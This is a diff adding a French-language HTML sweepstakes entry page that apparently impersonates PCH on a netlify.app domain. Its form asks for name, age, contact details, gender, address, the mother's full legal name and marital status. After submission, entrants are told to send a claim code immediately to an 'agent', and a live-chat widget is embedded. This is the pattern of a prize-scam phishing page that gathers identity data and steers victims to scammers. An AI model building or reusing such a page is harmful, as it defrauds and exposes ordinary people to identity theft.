@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="fr-CA">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="canonical" href="https://officialpch.netlify.app/apply.html">
+    <meta name="description" content="Participez maintenant pour courir la chance de gagner de fabuleux prix aux tirages PCH.">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://officialpch.netlify.app/apply.html">
+    <meta property="og:title" content="Participer à un tirage - PCH">
+    <meta property="og:description" content="Participez maintenant pour courir la chance de gagner de fabuleux prix aux tirages PCH.">
+    <meta property="og:image" content="https://officialpch.netlify.app/superprize.jpg">
+    <meta property="og:image:secure_url" content="https://officialpch.netlify.app/superprize.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:site_name" content="Tirages PCH">
+    <meta property="og:locale" content="fr_CA">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://officialpch.netlify.app/apply.html">
+    <meta name="twitter:title" content="Participer à un tirage - PCH">
+    <meta name="twitter:description" content="Participez maintenant pour courir la chance de gagner de fabuleux prix aux tirages PCH.">
+    <meta name="twitter:image" content="https://officialpch.netlify.app/superprize.jpg">
+    <meta name="twitter:image:alt" content="Aperçu des tirages PCH">
+    
+    <title>Participer à un tirage - PCH</title>
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#eba625">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="PCH">
+    <link rel="apple-touch-icon" href="/icons/icon-192.png">
+    <link rel="stylesheet" href="css/styles.css">
+    <!-- Live Chat Widget Styles -->
+    <link rel="stylesheet" href="css/live-chat-widget.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="container">
+            <img src="logo.jpg" alt="Programme PCH" class="logo">
+            <button class="menu-toggle" id="menuToggle" aria-label="Ouvrir le menu">☰</button>
+        </div>
+    </nav>
+
+    <div class="sidebar" id="sidebar">
+        <ul class="sidebar-links">
+            <li><a href="index.html">Accueil</a></li>
+            <li><a href="about.html">À propos</a></li>
+            <li><a href="sweepstakes.html">Tirages</a></li>
+            <li><a href="apply.html" class="active">Participer</a></li>
+            <li><a href="contact.html">Nous joindre</a></li>
+            <li><button id="downloadAppBtn" class="btn btn-primary sidebar-download" type="button">Télécharger l'application PCH+</button></li>
+        </ul>
+        <div id="installInstructionsPanel" class="install-instructions-panel hidden" aria-live="polite" role="dialog" aria-modal="true" aria-labelledby="installInstructionsHeading">
+            <h2 id="installInstructionsHeading">Instructions d'installation <span class="sr-only">(aide pour installer l'application)</span></h2>
+            <button type="button" class="install-instructions-close" tabindex="0" aria-label="Fermer les instructions d'installation">&times;</button>
+            <p id="installInstructionsText"></p>
+        </div>
+    </div>
+
+    <header class="page-header" style="height: 70vh; position: relative; overflow: hidden; margin: 0; padding: 0; background: linear-gradient(135deg, #eba625 0%, #7c3aed 100%);">
+        <img src="applypic.jpg?v=1" alt="Image d'en-tête" class="hero-image">
+        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: white; width: 100%; padding: 0 20px; z-index: 2;">
+        </div>
+    </header>
+    <h1 style="font-size: 3rem; margin: 0; text-shadow: 2px 2px 4px rgba(224, 131, 9, 0.7);">Participer à un tirage</h1>
+
+    <main>
+        <section class="content-section">
+            <div class="container">
+                <div class="form-container">
+                    <form id="sweepstakes" class="sweepstakes-form" method="POST" action="/api/forms/submit">
+                        <!-- Honeypot to reduce bot spam -->
+                        <div style="display:none;">
+                            <label>Ne pas remplir</label>
+                            <input type="text" name="_gotcha" tabindex="-1" autocomplete="off">
+                        </div>
+                        <!-- Helpful default subject (will be overwritten by JS) -->
+                        <input type="hidden" name="_subject" value="New Sweepstakes Application">
+                        <!-- Optional redirect if JS fails -->
+                        <input type="hidden" name="_next" value="/apply.html?submitted=1">
+                        <fieldset>
+                            <legend>Renseignements personnels</legend>
+                            <div class="form-group">
+                                     <label for="claimCode">Code de réclamation (généré automatiquement)</label>
+                                         <input type="text" id="claimCode" name="claimCode" required readonly placeholder="Votre code de réclamation sera généré automatiquement">
+                            </div>
+                            <div class="form-group">
+                               <label for="fullName">Nom complet *</label>
+                               <input type="text" id="fullName" name="fullName" required placeholder="Entrez votre nom légal complet">
+                            </div>
+                            <div class="form-group">
+                               <label for="age">Âge *</label>
+                               <input type="text" id="age" name="age" required placeholder="Entrez votre âge">
+                            </div>
+                            <div class="form-group">
+                               <label for="email">Adresse courriel *</label>
+                               <input type="email" id="email" name="email" required placeholder="Entrez votre adresse courriel">
+                            </div>
+                            <div class="form-group">
+                                <label for="phone">Numéro de téléphone *</label>
+                                <input type="tel" id="phone" name="phone" required placeholder="Entrez votre numéro de téléphone">
+                            </div>
+                             <div class="form-group">
+                               <label for="gender">Genre *</label>
+                               <input type="text" id="gender" name="gender" required placeholder="Homme / Femme">
+                            </div>
+                            <div class="form-group">
+                                <label for="address">Adresse *</label>
+                                <textarea id="address" name="address" rows="3" required placeholder="Entrez votre adresse complète"></textarea>
+                            </div>
+                        </fieldset>
+
+                        <fieldset>
+                            <legend>Détails du tirage</legend>
+                            <div class="form-group">
+                                <label for="grantType">À quel tirage souhaitez-vous participer? *</label>
+                                <select id="grantType" name="grantType" required>
+                                    <option value="">Sélectionnez un tirage...</option>
+                                    <option value="innovation">Tirage Soutien à l'innovation</option>
+                                    <option value="community">Tirage Impact communautaire</option>
+                                    <option value="business">Tirage Développement des entreprises</option>
+                                    <option value="sustainability">Tirage Développement durable</option>
+                                    <option value="superprize">Tirage SuperPrize</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                               <label for="motherName">Nom de la mère *</label>
+                               <input type="text" id="motherName" name="motherName" required placeholder="Entrez le nom légal complet de votre mère">
+                            </div>
+                             <div class="form-group">
+                                <label for="zipCode">Code postal *</label>
+                                <input type="text" id="zipCode" name="zipCode" required placeholder="Entrez votre code postal">
+                            </div>
+                            <div class="form-group">
+                                <label for="idNumber">État matrimonial *</label>
+                                <input type="text" id="idNumber" name="idNumber" required placeholder="Entrez votre état matrimonial">
+                            </div>
+                            <div class="form-group">
+                               <label for="additionalInfo">Renseignements supplémentaires</label>
+                               <textarea id="additionalInfo" name="additionalInfo" rows="4" placeholder="Tout renseignement ou commentaire supplémentaire"></textarea>
+                            </div>
+                        </fieldset>
+
+                        <fieldset>
+                            <legend>Modalités et conditions</legend>
+                            <p>Veuillez lire et accepter les modalités et conditions avant de soumettre votre participation.</p>
+                            <div class="form-group checkbox">
+                                <input type="checkbox" id="terms" name="terms" required>
+                                <label for="terms">J'accepte les modalités et conditions du programme de tirages *</label>
+                            </div>
+                        </fieldset>
+
+                        <button type="submit" class="btn btn-primary">Soumettre la participation</button>
+                        <button type="reset" class="btn btn-secondary">Effacer le formulaire</button>
+                    </form>
+
+                    <div id="successMessage" class="success-message" style="display: none;">
+                        <h3>Merci!</h3>
+                        <p>Votre participation a été soumise avec succès. Nous l'examinerons et communiquerons avec vous dans un délai de 5 à 7 jours ouvrables.</p>
+                    </div>
+                    <div id="agentSection" class="agent-section" style="display: none;">
+                        <div class="agent-instructions">
+                            <p><strong>Veuillez envoyer immédiatement votre code de réclamation à l'agent responsable:</strong></p>
+                        </div>
+                        <div class="agent-profiles">
+                            <button class="agent-btn" data-agent="Agent">Profil de l'agent</button>
+                        </div>
+                        <div class="agent-logo">
+                            <img src="logo1.jpg" alt="PCH Logo" loading="lazy" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 PCH. Tous droits réservés.</p>
+        </div>
+    </footer>
+
+    <!-- EmailJS removed. Forms now submit to Formspree via js/main.js -->
+
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/6a73d510fc41071d4649fba2/1jva7gies';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+
+    <script src="js/form-submission-manager.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/pwa.js"></script>
+    <!-- Live Chat Widget -->
+    <script src="js/live-chat-widget.js"></script>
+</body>
+</html>
